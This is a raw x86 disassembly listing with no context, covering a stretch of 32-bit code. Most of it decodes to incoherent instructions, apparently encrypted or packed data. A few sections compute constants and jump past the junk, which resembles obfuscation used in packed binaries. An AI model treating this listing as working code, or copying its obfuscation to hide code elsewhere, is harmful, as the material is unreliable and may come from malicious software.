  40d219:	xor    ah,BYTE PTR [edi]
  40d21b:	clc    
  40d21c:	jnp    0x40d253
  40d21e:	out    0x76,eax
  40d220:	outs   dx,DWORD PTR ds:[esi]
  40d221:	or     eax,0x92a94c93
  40d226:	mov    ss,edi
  40d228:	frstor [eax+0x31]
  40d22b:	xor    esi,edi
  40d22d:	dec    ebp
  40d22e:	outs   dx,DWORD PTR ds:[esi]
  40d22f:	xchg   edx,eax
  40d230:	or     edx,DWORD PTR cs:[eax]
  40d233:	jmp    0x40d1bb
  40d235:	pusha  
  40d236:	mov    ecx,0xc8a6fa32
  40d23b:	push   0xffffffcf
  40d23d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d23e:	(bad)  
  40d23f:	int    0xbd
  40d241:	addr16 mov ecx,0xe92e9419
  40d247:	pop    edi
  40d248:	mov    cl,0xea
  40d24a:	jmp    0x87d4:0xacf1e495
  40d251:	push   edi
  40d252:	leave  
  40d253:	inc    ecx
  40d254:	cdq    
  40d255:	or     al,0x40
  40d257:	out    dx,al
  40d258:	lods   eax,DWORD PTR ds:[esi]
  40d259:	repz ss pop ss
  40d25c:	rcl    BYTE PTR [edi-0x74f1fb78],1
  40d262:	inc    ebp
  40d263:	in     al,dx
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	adc    al,0xc7
  40d2f4:	mov    ebx,0x18e22db0
  40d2f9:	sbb    dl,dl
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    al,dl
  40d2ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d301:	xor    DWORD PTR [esi+esi*8+0x68a199d6],esi
  40d308:	xor    edx,DWORD PTR [edx-0x49]
  40d30b:	nop
  40d30c:	(bad)  
  40d30d:	or     ah,BYTE PTR ds:0xf14e8a5b
  40d313:	and    al,0xba
  40d315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d316:	rol    DWORD PTR [edx+eiz*2],0x94
  40d31a:	in     al,0x2b
  40d31c:	icebp  
  40d31d:	test   al,0x66
  40d31f:	ficomp WORD PTR [ecx+ecx*2+0x1]
  40d323:	xlat   BYTE PTR ds:[ebx]
  40d324:	cmp    eax,0x4ff103af
  40d329:	mov    DWORD PTR [edi],esp
  40d32b:	ret    
  40d32c:	bound  eax,QWORD PTR [edx-0xa6e8fdb]
  40d332:	test   al,0xad
  40d334:	add    ebp,esi
  40d336:	retf   
  40d337:	sbb    dh,cl
  40d339:	dec    edi
  40d33a:	xchg   ecx,eax
  40d33b:	adc    ecx,DWORD PTR [edi+0x24453282]
  40d341:	mov    dl,0xd7
  40d343:	inc    edx
  40d344:	mov    al,0xbe
  40d346:	adc    esi,DWORD PTR [edx+0x557ca355]
  40d34c:	in     al,0xa0
  40d34e:	pop    eax
  40d34f:	xchg   ebx,eax
  40d350:	in     eax,0x43
  40d352:	sub    BYTE PTR [esi-0x35ab10e9],dl
  40d358:	dec    edx
  40d359:	cmp    esi,DWORD PTR [eax-0x6f67622c]
  40d35f:	pop    es
  40d360:	call   0x262846bf
  40d365:	sahf   
  40d366:	imul   ecx,DWORD PTR [edi+eax*1],0xd8b3fb50
  40d36d:	into   
  40d36e:	icebp  
  40d36f:	xchg   esp,eax
  40d370:	ret    
  40d371:	dec    eax
  40d372:	or     DWORD PTR [edx-0x4d],ebx
  40d375:	sub    DWORD PTR [eax],ebp
  40d377:	jno    0x904d94f
  40d37d:	xor    ebx,esp
  40d37f:	sbb    DWORD PTR ds:0xdd2ea032,esp
  40d385:	les    ecx,FWORD PTR [edx]
  40d387:	cmp    al,0x6d
  40d389:	fdivr  QWORD PTR [eax-0x20]
  40d38c:	mov    edx,0xf7bde560
  40d391:	and    DWORD PTR [ecx+0x14c24c39],0xf4185ba8
  40d39b:	aaa    
  40d39c:	mov    ecx,DWORD PTR [esi+0x3c]
  40d39f:	jne    0x40d396
  40d3a1:	retf   
  40d3a2:	mov    eax,ds:0xcc028b1c
  40d3a7:	push   ebp
  40d3a8:	call   0x71361636
  40d3ad:	cmp    eax,0x128cedf7
  40d3b2:	sbb    eax,edi
  40d3b4:	add    DWORD PTR [edx],esp
  40d3b6:	dec    esi
  40d3b7:	xchg   edi,eax
  40d3b8:	mov    DWORD PTR cs:[ebp-0x38],edi
  40d3bc:	pop    es
  40d3bd:	xlat   BYTE PTR ds:[ebx]
  40d3be:	mov    edi,0x688bcb7c
  40d3c3:	loope  0x40d420
  40d3c5:	out    dx,al
  40d3c6:	outs   dx,BYTE PTR ds:[esi]
  40d3c7:	adc    DWORD PTR [esi-0x4d],0x32895f5a
  40d3ce:	pop    ebp
  40d3cf:	or     BYTE PTR [ebx-0x3e],ch
  40d3d2:	sti    
  40d3d3:	call   0x5f11a1c6
  40d3d8:	rol    DWORD PTR [ecx+0x1c],1
  40d3db:	imul   BYTE PTR [ebx]
  40d3dd:	test   DWORD PTR [ebx+0x27],ebp
  40d3e0:	pop    ds
  40d3e1:	add    eax,0xd8baeb9c
  40d3e6:	or     al,bh
  40d3e8:	sbb    eax,0xc165aba1
  40d3ed:	es das 
  40d3ef:	xchg   esp,eax
  40d3f0:	mov    WORD PTR [eax-0x3c],es
  40d3f3:	ins    BYTE PTR es:[edi],dx
  40d3f4:	sub    DWORD PTR [ebp*1-0x381c2faa],ebp
  40d3fb:	call   0x78a2:0x13dfbcd9
  40d402:	lea    edx,[esp+ebx*2-0x204515f2]
  40d409:	add    DWORD PTR ds:0xbd447f61,edi
  40d40f:	add    ebp,DWORD PTR ds:[edx-0x415d634f]
  40d416:	hlt    
  40d417:	pusha  
  40d418:	push   ebx
  40d419:	leave  
  40d41a:	add    eax,0xcd5f227c
  40d41f:	scas   eax,DWORD PTR es:[edi]
  40d420:	jge    0x40d41d
  40d422:	jmp    0x40d3ee
  40d424:	call   0x66b8:0x89f7bba1
  40d42b:	mul    esi
  40d42d:	lahf   
  40d42e:	dec    edi
  40d42f:	xchg   edx,eax
  40d430:	test   eax,0x63575a09
  40d435:	test   al,0x55
  40d437:	dec    edi
  40d438:	rcr    DWORD PTR [ebx-0x2e],cl
  40d43b:	inc    eax
  40d43c:	shr    BYTE PTR ds:0x896feb74,0xe9
  40d443:	and    DWORD PTR [edx],esp
  40d445:	push   0xffffffcc
  40d447:	scas   eax,DWORD PTR es:[edi]
  40d448:	fisttp DWORD PTR [ecx+0x18]
  40d44b:	outs   dx,DWORD PTR ds:[esi]
  40d44c:	pop    esp
  40d44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d44e:	mov    edi,esp
  40d450:	pop    esi
  40d451:	mov    cl,0x4
  40d453:	int    0x35
  40d455:	rcr    DWORD PTR [ebx-0x1f],0xc0
  40d459:	mov    eax,0xc779beed
  40d45e:	pop    eax
  40d45f:	mov    edx,0x205fdc37
  40d464:	not    DWORD PTR [edi-0x5a]
  40d467:	push   edi
  40d468:	int3   
  40d469:	je     0x40d4c4
  40d46b:	out    dx,eax
  40d46c:	test   ebx,ebx
  40d46e:	ds jecxz 0x40d3ff
  40d471:	imul   esp,esp,0x21
  40d474:	push   0x53cee10f
  40d479:	sub    dl,al
  40d47b:	xor    DWORD PTR ds:0x3c70166c,eax
  40d481:	sbb    eax,0x4726869a
  40d486:	and    BYTE PTR [eax+0x128eff2c],0x77
  40d48d:	xor    esp,DWORD PTR [eax+0x4b4d55e8]
  40d493:	sbb    al,0x6d
  40d495:	and    al,0x56
  40d497:	in     eax,dx
  40d498:	cmp    esp,0xffffffcc
  40d49b:	push   esp
  40d49c:	pop    ecx
  40d49d:	fcom   DWORD PTR [edi]
  40d49f:	push   esp
  40d4a0:	add    eax,DWORD PTR [edx+0x62]
  40d4a3:	lods   eax,DWORD PTR ds:[esi]
  40d4a4:	dec    esp
  40d4a5:	jns    0x40d4fd
  40d4a7:	pop    esp
  40d4a8:	out    dx,eax
  40d4a9:	cmp    al,ch
  40d4ab:	jmp    0x13e6529e
  40d4b0:	ins    BYTE PTR es:[edi],dx
  40d4b1:	sub    al,0xa1
  40d4b3:	mov    al,ds:0xbd08d418
  40d4b8:	cdq    
  40d4b9:	add    al,BYTE PTR [eax+0x5b]
  40d4bc:	jg     0x40d518
  40d4be:	mov    esi,0xe7430ba4
  40d4c3:	dec    BYTE PTR [ebx-0x540b963b]
  40d4c9:	xchg   ebp,eax
  40d4ca:	mov    ebx,DWORD PTR [eax+0x67]
  40d4cd:	or     al,BYTE PTR [eax-0x2a4b316e]
  40d4d3:	push   esp
  40d4d4:	idiv   bh
  40d4d6:	leave  
  40d4d7:	jecxz  0x40d47f
  40d4d9:	retf   0x1ad
  40d4dc:	or     ebp,DWORD PTR [edi]
  40d4de:	mov    bh,0x17
  40d4e0:	neg    BYTE PTR [ebp-0x60]
  40d4e3:	adc    ch,BYTE PTR ds:0x89ec2df6
  40d4e9:	xchg   esi,eax
  40d4ea:	sbb    BYTE PTR [ebp-0xb],bh
  40d4ed:	inc    eax
  40d4ee:	aad    0x24
  40d4f0:	jmp    0x40d542
  40d4f2:	shr    BYTE PTR [esp+edx*1+0x33],cl
  40d4f6:	push   ebx
  40d4f7:	xor    DWORD PTR [ecx-0x23ae2f22],eax
  40d4fd:	inc    edx
  40d4fe:	in     eax,0xe0
  40d500:	or     eax,DWORD PTR [edx+0x47dbef2d]
  40d506:	stos   BYTE PTR es:[edi],al
  40d507:	and    ah,BYTE PTR [edx]
  40d509:	adc    dh,BYTE PTR [edi]
  40d50b:	popf   
  40d50c:	mov    eax,0x4bd31a50
  40d511:	sar    DWORD PTR ds:0x48aa5cce,0x12
  40d518:	fwait
  40d519:	retf   0xe00d
  40d51c:	repz add ecx,DWORD PTR ss:[edi+edx*1+0x18]
  40d522:	ror    BYTE PTR [esi+0x19924605],cl
  40d528:	icebp  
  40d529:	test   DWORD PTR [edi-0x68ca1626],ebp
  40d52f:	cli    
  40d530:	xchg   esp,eax
  40d531:	or     eax,0x111f1926
  40d536:	xor    DWORD PTR [ecx+0x45291fbe],0xffffffc5
  40d53d:	aaa    
  40d53e:	push   eax
  40d53f:	lds    ecx,FWORD PTR [ecx+0x40]
  40d542:	sub    eax,0x6d06c88a
  40d547:	add    eax,0xc3fb6f83
  40d54c:	sub    cl,BYTE PTR [esi-0x1ec3a474]
  40d552:	cmp    al,BYTE PTR [esi+0x35777413]
  40d558:	out    0x82,al
  40d55a:	inc    eax
  40d55b:	inc    edx
  40d55c:	scas   eax,DWORD PTR es:[edi]
  40d55d:	jg     0x40d52c
  40d55f:	test   al,bh
  40d561:	lock cdq 
  40d563:	hlt    
  40d564:	mov    al,0x9d
  40d566:	popf   
  40d567:	mov    edi,0x52395350
  40d56c:	jb     0x40d5b7
  40d56e:	in     al,0x1
  40d570:	adc    BYTE PTR [edx-0x2f465c13],bl
  40d576:	sbb    DWORD PTR [eax-0x23a87d02],ecx
  40d57c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d57d:	sub    ecx,DWORD PTR [edx]
  40d57f:	ins    DWORD PTR es:[edi],dx
  40d580:	xchg   DWORD PTR [edi],esp
  40d582:	fsubp  st(2),st
  40d584:	pop    edx
  40d585:	cmc    
  40d586:	xchg   esi,eax
  40d587:	(bad)  
  40d588:	clc    
  40d589:	test   eax,0x65ff29c4
  40d58e:	aam    0x2b
  40d590:	mov    al,BYTE PTR [esi+esi*2]
  40d593:	cmp    eax,0x2a81be8d
  40d598:	or     edi,DWORD PTR [ecx+eax*2]
  40d59b:	jnp    0x40d60f
  40d59d:	push   cs
  40d59e:	cwde   
  40d59f:	xchg   esp,esi
  40d5a1:	je     0x40d5ad
  40d5a3:	in     al,0x90
  40d5a5:	mov    ecx,DWORD PTR [ebp-0x20]
  40d5a8:	xor    edx,edx
  40d5aa:	jmp    0x40d86e
  40d5af:	pop    edx
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	push   0xfffffffc
  40d5bd:	xor    ebp,DWORD PTR [edx-0x19]
  40d5c0:	fcomp  QWORD PTR [eax]
  40d5c2:	sbb    dl,dl
  40d5c4:	adc    al,0x18
  40d5c6:	sbb    BYTE PTR [esi],dh
  40d5c8:	into   
  40d5c9:	test   BYTE PTR [esi],ah
  40d5cb:	adc    ecx,eax
  40d5cd:	push   es
  40d5ce:	jmp    0x274f8a59
  40d5d3:	inc    ebp
  40d5d4:	dec    eax
  40d5d5:	js     0x40d58c
  40d5d7:	pop    edi
  40d5d8:	ret    0x1e4c
  40d5db:	bound  ebp,QWORD PTR [ebx]
  40d5dd:	ror    DWORD PTR [edx+ebx*8],1
  40d5e0:	call   0x462d:0x67e4132e
  40d5e7:	mov    edx,0x978b61d
  40d5ed:	daa    
  40d5ee:	push   ds
  40d5ef:	hlt    
  40d5f0:	addr16 and bl,dh
  40d5f3:	jl     0x40d64b
  40d5f5:	inc    ebx
  40d5f6:	push   esp
  40d5f7:	leave  
  40d5f8:	push   ds
  40d5f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5fa:	inc    ebp
  40d5fb:	push   ebx
  40d5fc:	sub    bl,dl
  40d5fe:	mov    esp,0xc645a179
  40d603:	scas   al,BYTE PTR es:[edi]
  40d604:	imul   ebx,esi,0x4c
  40d607:	out    dx,al
  40d608:	or     BYTE PTR [esi+0x38bec1d8],0xdb
  40d60f:	and    bh,BYTE PTR [esi-0x21a1c428]
  40d615:	xchg   DWORD PTR [ecx+0x57],edi
  40d618:	inc    edx
  40d619:	jg     0x40d5fe
  40d61b:	pushf  
  40d61c:	push   cs
  40d61d:	in     eax,0x16
  40d61f:	dec    edi
  40d620:	push   ss
  40d621:	add    DWORD PTR [ecx+0x6ad4c96],eax
  40d627:	cmp    DWORD PTR ds:0x5f0a5d70,ebx
  40d62d:	imul   esp,DWORD PTR [ebx+0x1c],0x706c3585
  40d634:	loop   0x40d697
  40d636:	loope  0x40d649
  40d638:	mov    edi,0x1a4b6480
  40d63d:	and    dh,BYTE PTR [esi-0x11f1cdf5]
  40d643:	mov    edx,0x89082218
  40d648:	cmp    al,0xa8
  40d64a:	in     eax,0xe
  40d64c:	and    eax,0xbe28303c
  40d651:	clc    
  40d652:	jg     0x40d65d
  40d654:	test   BYTE PTR [esp+ebx*2+0x57],al
  40d658:	sbb    dh,ah
  40d65a:	int    0x6
  40d65c:	and    DWORD PTR [ebx],edx
  40d65e:	inc    esi
  40d65f:	mov    BYTE PTR [ecx-0x468c715f],ah
  40d665:	data16 sub BYTE PTR [esp+eiz*4-0x4d47d45f],bl
  40d66d:	out    0x4c,al
  40d66f:	pop    ss
  40d670:	mov    WORD PTR [eax+eax*8+0x40ca9af9],gs
  40d677:	adc    dh,bl
  40d679:	fiadd  WORD PTR [ecx]
  40d67b:	repnz in al,0xe1
  40d67e:	mov    ds:0xfb5c5aaf,eax
  40d683:	(bad)  
  40d685:	jp     0x40d63f
  40d687:	sbb    esi,DWORD PTR ds:0x8ae22374
  40d68d:	dec    edi
  40d68e:	sbb    BYTE PTR [ebx+0x3493ff7],dh
  40d694:	out    0x53,al
  40d696:	inc    esp
  40d697:	rcl    ebx,1
  40d699:	ret    0x2423
  40d69c:	mov    cl,0x8b
  40d69e:	sbb    al,0xbb
  40d6a0:	inc    esi
  40d6a1:	call   0xc984abf9
  40d6a6:	out    dx,eax
  40d6a7:	mov    dl,0xb8
  40d6a9:	and    DWORD PTR [ebp-0x3f230089],ebp
  40d6af:	push   edx
  40d6b0:	div    eax
  40d6b2:	and    esi,DWORD PTR es:[esi+0x612e5f12]
  40d6b9:	imul   ecx,DWORD PTR [ecx+0x22],0x1e
  40d6bd:	sbb    ebp,DWORD PTR [ebx]
  40d6bf:	or     eax,0x13f25008
  40d6c4:	or     DWORD PTR [esi+0xd1bbe31],ebp
  40d6ca:	xchg   edx,eax
  40d6cb:	push   esp
  40d6cc:	jg     0x40d6d6
  40d6ce:	scas   eax,DWORD PTR es:[edi]
  40d6cf:	dec    edx
  40d6d0:	test   BYTE PTR [ebp-0x34],0xdf
  40d6d4:	sbb    eax,0x91c6dc8b
  40d6d9:	mov    edx,0x4729aa58
  40d6de:	push   0x64
  40d6e0:	arpl   WORD PTR [eax+0x2c990b3a],bp
  40d6e6:	xor    eax,0x409f4a7e
  40d6eb:	and    DWORD PTR [edi-0x24299bd1],esi
  40d6f1:	dec    esi
  40d6f2:	in     eax,0x91
  40d6f4:	pushf  
  40d6f5:	in     al,0xa2
  40d6f7:	test   DWORD PTR [edi],esi
  40d6f9:	ins    DWORD PTR es:[edi],dx
  40d6fa:	jnp    0x40d759
  40d6fc:	ja     0x40d745
  40d6fe:	dec    eax
  40d6ff:	add    BYTE PTR [edx+0x5cb37aeb],al
  40d705:	push   edx
  40d706:	jl     0x40d6d7
  40d708:	stos   BYTE PTR es:[edi],al
  40d709:	sub    eax,0x9ecba7e5
  40d70e:	or     BYTE PTR fs:[ecx+eiz*8],0x52
  40d713:	aam    0x95
  40d715:	jge    0x40d770
  40d717:	mov    ebp,0x8039b140
  40d71c:	out    dx,al
  40d71d:	add    bh,dl
  40d71f:	adc    al,0x7d
  40d721:	or     DWORD PTR [edi+0x316761ab],0x3b
  40d728:	call   0x3c57:0xe1bf2151
  40d72f:	out    0x6b,al
  40d731:	mov    eax,0x5e921ef2
  40d736:	mov    esi,0x34877c82
  40d73b:	int    0xd6
  40d73d:	lods   eax,DWORD PTR ds:[esi]
  40d73e:	xor    eax,0xf0ec14cb
  40d743:	mov    cs,WORD PTR [eax-0x5]
  40d746:	jp     0x40d7a8
  40d748:	push   ecx
  40d749:	sbb    DWORD PTR [edi-0x58daaf63],esp
  40d74f:	cmp    eax,0xda2c881
  40d754:	(bad)  
  40d755:	pop    ss
  40d756:	add    eax,0x1aaef9f7
  40d75b:	daa    
  40d75c:	dec    edi
  40d75d:	ins    DWORD PTR es:[edi],dx
  40d75e:	nop
  40d75f:	push   edx
  40d760:	and    BYTE PTR [esi],al
  40d762:	into   
  40d763:	pop    ds
  40d764:	push   ds
  40d765:	pop    ss
  40d766:	repz neg DWORD PTR ss:[ecx+0x25]
  40d76b:	push   edx
  40d76c:	or     DWORD PTR [edi],0x73
  40d76f:	daa    
  40d770:	dec    ebp
  40d771:	mov    ah,0x41
  40d773:	add    eax,0x509469db
  40d778:	cmp    DWORD PTR [esi+0x32],ebx
  40d77b:	push   edx
  40d77c:	xor    eax,0x2cf88442
  40d781:	push   ds
  40d782:	pop    esi
  40d783:	or     BYTE PTR [edi+0xa6f0077],ah
  40d789:	mov    esp,0x7183e7af
  40d78e:	mov    ds:0xb02e8c56,al
  40d793:	push   ebx
  40d794:	and    DWORD PTR [esi-0x3d],esp
  40d797:	fwait
  40d798:	sub    DWORD PTR [ecx-0x54d4e948],esi
  40d79e:	mov    edi,0xb8af6095
  40d7a3:	int    0xde
  40d7a5:	and    eax,0xd2dd6419
  40d7aa:	ror    ebp,cl
  40d7ac:	(bad)  
  40d7ad:	in     eax,dx
  40d7ae:	in     al,0x19
  40d7b0:	into   
  40d7b1:	(bad)  
  40d7b2:	fsubr  QWORD PTR [esi+0x56]
  40d7b5:	hlt    
  40d7b6:	or     eax,0x46f59f0b
  40d7bb:	nop
  40d7bc:	test   BYTE PTR [edx-0x4a],cl
  40d7bf:	and    bl,BYTE PTR [edi+0x11]
  40d7c2:	mov    dl,0x64
  40d7c4:	outs   dx,BYTE PTR ds:[esi]
  40d7c5:	push   ss
  40d7c6:	mov    DWORD PTR [edi],ebx
  40d7c8:	cmp    BYTE PTR [edi+0xd],bl
  40d7cb:	adc    al,0x7e
  40d7cd:	cmp    al,0xbc
  40d7cf:	xor    edi,DWORD PTR [edi]
  40d7d1:	fldenv [edi-0x7b5ee5e6]
  40d7d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7d8:	addr16 popa 
  40d7da:	and    eax,0x1bbbed2e
  40d7df:	pop    eax
  40d7e0:	ins    DWORD PTR es:[edi],dx
  40d7e1:	pop    edx
  40d7e2:	addr16 std 
  40d7e4:	sti    
  40d7e5:	std    
  40d7e6:	repnz push es
  40d7e8:	arpl   WORD PTR [ebp-0x4e58f975],cx
  40d7ee:	pop    ds
  40d7ef:	xor    eax,0xcbe910bd
  40d7f4:	sub    DWORD PTR [esp+edx*4],ecx
  40d7f7:	jge    0x40d814
  40d7f9:	mov    ah,0x5b
  40d7fb:	aad    0xc2
  40d7fd:	leave  
  40d7fe:	ret    
  40d7ff:	lahf   
  40d800:	xchg   esi,eax
  40d801:	je     0x40d7fb
  40d803:	dec    esp
  40d804:	push   edi
  40d805:	fdiv   QWORD PTR [ebx]
  40d807:	lahf   
  40d808:	fcom   QWORD PTR [eax]
  40d80a:	(bad)  
  40d80b:	mov    esi,DWORD PTR [edx-0x66]
  40d80e:	ror    DWORD PTR [eax],1
  40d810:	xor    al,0x30
  40d812:	pop    ebx
  40d813:	cmp    ebx,DWORD PTR [edi]
  40d815:	retf   
  40d816:	int    0xd9
  40d818:	push   cs
  40d819:	xor    DWORD PTR ss:[esi+0x246026f3],esp
  40d820:	scas   al,BYTE PTR es:[edi]
  40d821:	push   0x4d
  40d823:	adc    DWORD PTR [esp+eiz*2],esi
  40d826:	test   eax,0x789a23cb
  40d82b:	sbb    al,0xa1
  40d82d:	xchg   edx,eax
  40d82e:	nop
  40d82f:	les    esp,FWORD PTR [eax-0x7e434cf2]
  40d835:	bound  ebx,QWORD PTR [edi+0xd]
  40d838:	(bad)  
  40d83a:	mov    esi,0x92caec72
  40d83f:	sub    al,0x36
  40d841:	xor    edx,DWORD PTR [edi-0x24]
  40d844:	cdq    
  40d845:	inc    ebx
  40d846:	and    ebx,edx
  40d848:	or     DWORD PTR [ecx+0x20c325cf],edx
  40d84e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d84f:	shl    DWORD PTR [ebx+0x28],1
  40d852:	sbb    bh,BYTE PTR [eax]
  40d854:	mov    eax,ds:0x21a2eab9
  40d859:	push   0x6
  40d85b:	xor    al,BYTE PTR [ebx*1-0x25202c94]
  40d862:	mov    ebx,0x9acaf603
  40d867:	push   edx
  40d868:	or     DWORD PTR [edi],ebp
  40d86a:	push   0x69
  40d86c:	aas    
  40d86d:	ret    
  40d86e:	mov    edi,0x4db5
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0x815c21bc
  40d894:	mov    al,0xa0
  40d896:	fcomp  DWORD PTR [eax]
  40d898:	sbb    dl,dl
  40d89a:	adc    al,0x18
  40d89c:	sbb    BYTE PTR [ecx+0x4a],ah
  40d89f:	scas   eax,DWORD PTR es:[edi]
  40d8a0:	das    
  40d8a1:	cmp    DWORD PTR [eax-0x48],ebx
  40d8a4:	mov    WORD PTR [ebp-0x6a],gs
  40d8a7:	jbe    0x40d8ae
  40d8a9:	adc    edx,ebx
  40d8ab:	ins    BYTE PTR es:[edi],dx
  40d8ac:	lahf   
  40d8ad:	xor    eax,0xbe79b5ea
  40d8b2:	sti    
  40d8b3:	inc    edx
  40d8b4:	or     ah,BYTE PTR ds:0x939b683b
  40d8ba:	inc    eax
  40d8bb:	xchg   esi,eax
  40d8bc:	(bad)  
  40d8be:	inc    esi
  40d8bf:	jmp    0x40d91a
  40d8c1:	push   cs
  40d8c2:	loope  0x40d857
  40d8c4:	test   BYTE PTR [ebp+esi*4-0x48],cl
  40d8c8:	shl    DWORD PTR [edx+0x68],cl
  40d8cb:	test   al,0x95
  40d8cd:	cld    
  40d8ce:	adc    eax,0x89720163
  40d8d3:	sub    eax,0x7e05c017
  40d8d8:	mov    esp,0x4f81497a
  40d8dd:	fstp   DWORD PTR [esp+eax*1+0x2e92ec5f]
  40d8e4:	adc    eax,0x56d2d16
  40d8e9:	(bad)  
  40d8ea:	and    al,0x58
  40d8ec:	inc    ecx
  40d8ed:	daa    
  40d8ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8ef:	mov    ebx,0xba2cf246
  40d8f4:	sbb    DWORD PTR [ecx-0x6d],esp
  40d8f7:	mov    al,ds:0x13a7f235
  40d8fc:	add    esi,DWORD PTR [eax-0x5ce24ef4]
  40d902:	das    
  40d903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d904:	pop    esi
  40d905:	js     0x40d96e
  40d907:	aad    0xdb
  40d909:	lea    edi,[eax]
  40d90b:	ja     0x1e7bb572
  40d911:	or     al,BYTE PTR [ecx-0xa5345b6]
  40d917:	daa    
  40d918:	jno    0x40d985
  40d91a:	pop    edx
  40d91b:	and    edx,ebp
  40d91d:	fnstsw WORD PTR [ebx+edi*1+0x50]
  40d921:	(bad)  
  40d922:	mov    ah,0x82
  40d924:	out    dx,eax
  40d925:	maskmovq mm5,(bad)
  40d926:	imul   DWORD PTR [edx+0x79]
  40d929:	adc    ecx,edi
  40d92b:	jmp    0x40d918
  40d92d:	and    ecx,DWORD PTR [esi+0x5439dde0]
  40d933:	lea    esp,[edx+0x717eda1b]
  40d939:	jl     0x40d9a2
  40d93b:	inc    ecx
  40d93c:	jbe    0x40d928
  40d93e:	pusha  
  40d93f:	outs   dx,DWORD PTR ds:[esi]
  40d940:	dec    eax
  40d941:	sub    DWORD PTR [di+0x7d],ebx
  40d945:	in     al,dx
  40d946:	dec    edx
  40d947:	in     al,0xd4
  40d949:	xor    DWORD PTR [ebx],esp
  40d94b:	mov    ah,0x8b
  40d94d:	cmp    DWORD PTR [edx],edi
  40d94f:	xor    DWORD PTR [eax+0x2f],ebx
  40d952:	arpl   WORD PTR [ebx+ebx*4+0x26],sp
  40d956:	imul   DWORD PTR [ebx]
  40d958:	aaa    
  40d959:	inc    esi
  40d95a:	(bad)  
  40d95b:	iret   
  40d95c:	popa   
  40d95d:	pushf  
  40d95e:	retf   
  40d95f:	arpl   WORD PTR [edx-0x2414aa3d],si
  40d965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d966:	lods   eax,DWORD PTR ds:[esi]
  40d967:	test   BYTE PTR [bx+di],bl
  40d96a:	fstp   st(1)
  40d96c:	jmp    0x9349aa2e
  40d971:	adc    ecx,DWORD PTR [edx-0x23]
  40d974:	fnstsw WORD PTR [esi+0x56]
  40d977:	(bad)  
  40d978:	cmc    
  40d979:	call   0x2706:0x62fc0cbe
  40d980:	pushf  
  40d981:	ins    BYTE PTR es:[edi],dx
  40d982:	cwde   
  40d983:	gs jge 0x40d989
  40d986:	pop    ds
  40d987:	in     eax,0xc8
  40d989:	not    cl
  40d98b:	sub    eax,0x4e494c28
  40d990:	xchg   esp,eax
  40d991:	dec    esi
  40d992:	loop   0x40d9db
  40d994:	xchg   ecx,eax
  40d995:	into   
  40d996:	mov    bh,0x5c
  40d998:	jmp    0x4b9c:0x98c708f
  40d99f:	dec    eax
  40d9a0:	ins    BYTE PTR es:[edi],dx
  40d9a1:	mov    ds:0x7e386a00,eax
  40d9a6:	push   ss
  40d9a7:	scas   eax,DWORD PTR es:[edi]
  40d9a8:	daa    
  40d9a9:	xchg   BYTE PTR [edi+0xa659a41],dh
  40d9af:	sbb    bh,BYTE PTR [eax+0x58977b16]
  40d9b5:	dec    esp
  40d9b6:	lock mov esi,0x5d89029d
  40d9bc:	call   0xf15:0x9b0a9ff7
  40d9c3:	inc    ebx
  40d9c4:	dec    esp
  40d9c5:	inc    ebx
  40d9c6:	mov    ebp,0x2c9d613c
  40d9cb:	mov    ecx,0xfd5238fe
  40d9d0:	xor    BYTE PTR [ebp+eiz*2-0x3f9f19fc],al
